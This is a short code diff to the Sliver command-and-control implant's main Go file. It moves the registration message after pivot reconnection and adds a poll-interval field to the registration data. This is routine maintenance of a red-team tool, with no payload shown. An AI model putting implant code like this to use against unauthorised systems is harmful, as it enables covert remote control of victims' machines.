@@ -41,6 +41,7 @@ import (
 	// {{if eq .Config.GOOS "windows"}}
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
+
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
@@ -158,11 +159,10 @@ func main() {
 }
 
 func mainLoop(connection *transports.Connection) {
-
-	connection.Send <- getRegisterSliver() // Send registration information
-
 	// Reconnect active pivots
 	pivots.ReconnectActivePivots(connection)
+
+	connection.Send <- getRegisterSliver() // Send registration information
 
 	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
@@ -286,6 +286,7 @@ func getRegisterSliver() *sliverpb.Envelope {
 		ActiveC2:          transports.GetActiveC2(),
 		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
 		ProxyURL:          transports.GetProxyURL(),
+		PollInterval:      uint32(transports.GetPollInterval() / time.Second),
 	})
 	if err != nil {
 		// {{if .Config.Debug}}
